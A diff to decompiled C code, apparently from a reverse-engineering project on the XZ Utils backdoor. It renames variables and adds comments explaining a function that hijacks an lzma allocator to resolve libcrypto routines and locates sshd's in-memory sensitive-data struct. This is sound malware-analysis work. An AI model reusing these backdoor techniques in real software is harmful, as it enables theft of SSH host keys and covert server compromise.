@@ -5,7 +5,7 @@
 
 
 /*
- * AutoDoc: Bootstraps the entire sensitive-data pipeline: it appends bookkeeping entries for `sshd_proxy_elevate`/socket helpers into the secret-data log, uses the fake lzma allocator (pointed at libcrypto) to resolve `EVP_PKEY_new_raw_public_key`, `EVP_Digest`, `EVP_DigestVerify`, `EVP_DigestVerifyInit`, `EVP_CIPHER_CTX_new`, `EVP_chacha20`, and sanity-checks that the library exports the `EVP_sm*` family the payload expects. It locates sshd's code/data segments, finds the real `sshd_main` entry (recording whether an ENDBR64 prefix is present), and runs both the xcalloc-based and `KRB5CCNAME` heuristics to recover candidate struct addresses. Each candidate is scored via `sshd_get_sensitive_data_score`, and whichever pointer clears the >=8 threshold is stored in `ctx->sshd_sensitive_data`; on failure all of the just-resolved libcrypto stubs are freed before the helper reports that no recon data was found.
+ * AutoDoc: Bootstraps the entire sensitive-data pipeline: it first emits log breadcrumbs for `sshd_proxy_elevate` and both socket helpers, zeroes the scratch batch, and re-roots the fake lzma allocator at libcrypto so every subsequent `lzma_alloc` call resolves EVP entry points (`EVP_Digest*`, `EVP_chacha20`, etc.) after verifying the `EVP_sm*` family still exists. It walks sshd's PT_LOAD spans to capture `.text`/`.data`, discovers the live `sshd_main` pointer, records whether the entry begins with ENDBR64, and extends the scan window through the trailing padding so both heuristics share the same bounds. The xcalloc and KRB5CCNAME passes then duke it out: each recovered pointer is scored via `sshd_get_sensitive_data_score`, the ctx publishes whichever candidate reaches >=8, and any failure tears down the temporary EVP handles before returning FALSE.
  */
 
 #include "xzre_types.h"
@@ -15,10 +15,10 @@ BOOL sshd_find_sensitive_data
                imported_funcs_t *funcs,global_context_t *ctx)
 
 {
-  Elf64_Addr EVar1;
-  Elf64_Ehdr *pEVar2;
-  u64 uVar3;
-  u64 uVar4;
+  Elf64_Addr digest_verify_addr;
+  Elf64_Ehdr *libcrypto_header;
+  u64 code_segment_span;
+  u64 data_segment_span;
   u8 *code_start;
   u8 *code_segment_end;
   BOOL operation_ok;
@@ -81,6 +81,7 @@ BOOL sshd_find_sensitive_data
     return FALSE;
   }
   probe_cursor = &secret_probe_items;
+  // AutoDoc: Scrub the temporary append batch once it lands in the log so the stack copy can't be re-used or leaked.
   for (probe_clear_idx = 0x18; probe_clear_idx != 0; probe_clear_idx = probe_clear_idx + -1) {
     *(undefined4 *)&probe_cursor->anchor_pc = 0;
     probe_cursor = (secret_data_item_t *)((long)probe_cursor + (ulong)zero_stride * -8 + 4);
@@ -101,9 +102,9 @@ BOOL sshd_find_sensitive_data
   if (digest_verify_init != (pfn_EVP_DigestVerifyInit_t)0x0) {
     funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
   }
-  // AutoDoc: Grab sshd’s text segment (and later the data segment) so both heuristics operate on real in-memory bounds.
+  // AutoDoc: Grab sshd's text segment (and later the data segment) so both heuristics operate on real in-memory bounds.
   text_segment = elf_get_code_segment(sshd,&code_segment_size);
-  uVar3 = code_segment_size;
+  code_segment_span = code_segment_size;
   if (text_segment == (void *)0x0) {
     return FALSE;
   }
@@ -113,16 +114,17 @@ BOOL sshd_find_sensitive_data
   if (evp_sm_sym == (Elf64_Sym *)0x0) {
     return FALSE;
   }
+  // AutoDoc: Do the same for the writable PT_LOAD span so KRB5/xcalloc scans only walk sshd's `.data/.bss` window.
   data_start = (u8 *)elf_get_data_segment(sshd,&data_segment_size,FALSE);
-  uVar4 = data_segment_size;
+  data_segment_span = data_segment_size;
   if (data_start == (u8 *)0x0) {
     return FALSE;
   }
   if (digest_verify_sym != (Elf64_Sym *)0x0) {
-    EVar1 = digest_verify_sym->st_value;
-    pEVar2 = libcrypto->elfbase;
+    digest_verify_addr = digest_verify_sym->st_value;
+    libcrypto_header = libcrypto->elfbase;
     funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
-    funcs->EVP_DigestVerify = (pfn_EVP_DigestVerify_t)(pEVar2->e_ident + EVar1);
+    funcs->EVP_DigestVerify = (pfn_EVP_DigestVerify_t)(libcrypto_header->e_ident + digest_verify_addr);
   }
   cipher_ctx_new = (pfn_EVP_CIPHER_CTX_new_t)lzma_alloc(0x838,allocator);
   funcs->EVP_CIPHER_CTX_new = cipher_ctx_new;
@@ -135,24 +137,27 @@ BOOL sshd_find_sensitive_data
   if (operation_ok == FALSE) {
     return FALSE;
   }
+  // AutoDoc: Share the located `main()` pointer with the global context so every hook inspects the same entry.
   ctx->sshd_main_entry = sshd_main_addr;
   // AutoDoc: Capture whether sshd used CET/ENDBR64 so downstream patches can keep the landing pad intact.
   operation_ok = is_endbr64_instruction(sshd_main_addr,sshd_main_addr + 4,0xe230);
+  // AutoDoc: Record the ENDBR result so later writers know whether the entry point must start with CET glue.
   ctx->uses_endbr64 = (uint)(operation_ok != FALSE);
-  code_segment_end = (u8 *)((long)text_segment + uVar3);
+  code_segment_end = (u8 *)((long)text_segment + code_segment_span);
   if ((operation_ok != FALSE) &&
+     // AutoDoc: When CET is present, extend the `sshd_main` scan through the terminating NOP sled before handing those bounds to the heuristics.
      (operation_ok = find_function(code_start,(void **)0x0,&code_scan_limit,code_start,
-                            (u8 *)((long)text_segment + uVar3),FIND_NOP), code_segment_end = code_scan_limit,
+                            (u8 *)((long)text_segment + code_segment_span),FIND_NOP), code_segment_end = code_scan_limit,
      operation_ok == FALSE)) {
     return FALSE;
   }
   code_scan_limit = code_segment_end;
   // AutoDoc: Use the xcalloc heuristic to find a struct candidate by following the xcalloc(result) stores into .bss.
   operation_ok = sshd_get_sensitive_data_address_via_xcalloc
-                    (data_start,data_start + uVar4,code_start,code_scan_limit,refs,&xzcalloc_candidate_local);
+                    (data_start,data_start + data_segment_span,code_start,code_scan_limit,refs,&xzcalloc_candidate_local);
   // AutoDoc: Run the independent KRB5CCNAME-based scan in parallel so two separate heuristics can vote on the same address.
   krb_candidate_found = sshd_get_sensitive_data_address_via_krb5ccname
-                    (data_start,data_start + uVar4,code_start,code_scan_limit,&krb_candidate_local,sshd);
+                    (data_start,data_start + data_segment_span,code_start,code_scan_limit,&krb_candidate_local,sshd);
   chacha20_ctor = (pfn_EVP_chacha20_t)lzma_alloc(0xc28,allocator);
   winning_candidate = xzcalloc_candidate_local;
   funcs->EVP_chacha20 = chacha20_ctor;
@@ -183,10 +188,11 @@ LAB_001057a6:
     xzcalloc_score = sshd_get_sensitive_data_score(xzcalloc_candidate_local,sshd,refs);
     krb_score = 0;
   }
+  // AutoDoc: Pick the higher-scoring struct (ties favour xcalloc) but only after it clears the eight-point threshold.
   if (((krb_score <= xzcalloc_score) && (winning_candidate = xzcalloc_candidate_local, 7 < xzcalloc_score)) ||
      ((xzcalloc_score <= krb_score && (winning_candidate = krb_candidate_local, 7 < krb_score)))) {
 LAB_0010575e:
-    // AutoDoc: Persist the winning pointer into the global context so every hook can dereference sshd’s sensitive_data struct.
+    // AutoDoc: Persist the winning pointer into the global context so every hook can dereference sshd's sensitive_data struct.
     ctx->sshd_sensitive_data = winning_candidate;
     return TRUE;
   }
